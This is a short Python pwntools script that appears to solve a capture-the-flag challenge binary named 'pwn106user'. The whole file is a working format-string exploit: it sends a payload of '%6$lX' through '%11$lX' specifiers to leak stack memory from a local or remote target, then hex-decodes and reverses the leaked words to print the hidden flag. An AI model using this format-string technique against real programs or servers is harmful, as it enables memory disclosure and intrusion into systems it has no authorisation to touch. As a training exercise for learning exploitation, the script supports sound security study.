#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn106user.pwn106-user'
context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

payload = b"%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"

io = start()
io.recv()
io.recv()
io.sendline(payload)
output = io.recv().strip().split(b" ")[1].split(b".")
flag = ""
for word in output:
    decoded = unhex(word.decode("utf-8"))
    reverse_decoded = decoded[::-1]
    print(str(reverse_decoded.decode("utf-8")), end ="")
